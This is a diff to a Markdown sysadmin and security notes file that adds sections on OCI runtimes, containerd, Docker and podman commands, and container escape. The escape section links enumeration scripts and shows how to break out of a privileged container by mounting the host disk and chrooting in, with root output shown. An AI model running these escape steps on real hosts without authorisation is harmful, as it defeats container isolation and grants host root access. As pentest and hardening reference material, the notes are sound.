@@ -47,11 +47,55 @@ Tcpdump, Wireshark
 Intrusion Detection, Prevention System (IDS, IPS)
 
 [Suricata](https://docs.suricata.io)
+
 [Snort](https://docs.snort.org)
 
 [SysAdmin, Audit, Network, Security tools list](https://www.sans.org/tools)
 
-### [Docker](https://hub.docker.com)
+### Containers and [Docker](https://hub.docker.com)
+
+OCI (Open Container Initiative) [low level, runtime specification](https://github.com/opencontainers/runtime-spec) and [high level, image specification](https://github.com/opencontainers/image-spec) have standardized what was initially a mess.
+
+Containerd, Docker, [CRI-O](https://github.com/cri-o/cri-o), podman are high level since they implement at least parts of the image specification. Runc, Crun, gVisor, Firecracker implement the low level runtime specification that runs processes in the container.
+
+Containerd architecture schema.
+```
+[Docker CLI] [   Docker API   ] [    Build     ]
+                                                 Integrated Lifecycle
+[  Compose ] [Content Trust     [Authentication] Management
+              and verification]
+
+[ Security ] [    Network     ] [   Volumes    ] Docker
+
+[ Containerd                  [RUNC]           ] Container runtime
+
+------------------------------------------------ OCI
+
+[       Linux         ][        Windows        ] OS
+
+[       Hardware      ][        Cloud          ] Infrastructure
+```
+[Runc](https://github.com/opencontainers/runc) is written in Go. [Crun](https://github.com/containers/crun) is an alternative that needs fewer resources and is favored by Red Hat, written in C.
+
+Firecracker by AWS (Rust) has hardware enforced isolation via KVM. Google's gVisor has better Kubernetes and Docker integration, less overhead but less strict isolation (sandbox).
+
+containerd offers a fully namespaced API so multiple consumers can all use a single containerd instance without conflicting with one another in a single daemon.
+To inspect container
+```sh
+ctr namespaces
+ctr leases --help
+ctr -n docker tasks
+```
+#### Command examples
+
+Create a default OCI configuration.
+```sh
+runc spec && less config.json
+```
+Configure runc (enter namespace)
+```sh
+nsenter --help
+```
 
 [Docker CLI reference](https://docs.docker.com/reference/cli/docker/container/exec/)
 ```sh
@@ -62,6 +106,68 @@ docker images
 docker history rockylinux/rockylinux:10-ubi-micro
 docker inspect minikube
 docker exec --tty minikube sh -c 'uname -a'
+```
+Run `uv` [using docker](https://docs.astral.sh/uv/guides/integration/docker/)
+```sh
+docker run --rm -it ghcr.io/astral-sh/uv:debian uv --help
+```
+
+#### Docker CLI comparable tools
+
+Also compatible with `docker-compose`
+
+`alias docker=podman`
+```sh
+podman
+```
+[nerdctl](https://github.com/containerd/nerdctl.git), CLI for [containerd](https://containerd.io/docs/main/getting-started/).
+
+#### Docker helper tools
+
+Turn docker-compose files into flowcharts with [docker-compose-viz-mermaid](https://github.com/derlin/docker-compose-viz-mermaid)
+```sh
+docker run --rm -v $(PWD):/data derlin/docker-compose-viz-mermaid /data/docker-compose.yml -f png
+```
+
+#### Vulnerabilities, container escape
+
+TeamsSix container [escape check script](https://github.com/teamssix/container-escape-check/blob/main/container-escape-check.sh).
+[Deepce](https://github.com/stealthcopter/deepce/blob/main/deepce.sh) Docker Enumeration, Escalation of Privileges and Container Escapes
+
+[Genuine vulnerabilities](https://github.com/advisories/GHSA-cgrx-mc8f-2prm) exist but misconfiguration is a more likely way to escape a container.
+
+First, figure out if you're in a container.
+```sh
+ls -la / | grep dockerenv
+cat /proc/1/cgroup
+env | grep -i kube
+env | grep -i docker
+```
+
+##### `--privileged` container detection in the container
+
+Non-privileged containers can't create network interfaces.
+```sh
+ip link add dummy0 type dummy
+```
+List disks, mount the host root file system and other nested ones as needed, chroot into the host.
+```sh
+fdisk -l
+
+mount /dev/sda4 /mnt/hostroot
+... snip ...
+
+chroot /mnt/hostroot bash
+
+id
+```
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+##### Inspecting capabilities
+```sh
+capsh --print
+cat /proc/self/status | grep Cap
 ```
 
 ### [Ansible](https://galaxy.ansible.com/ui/collections/)
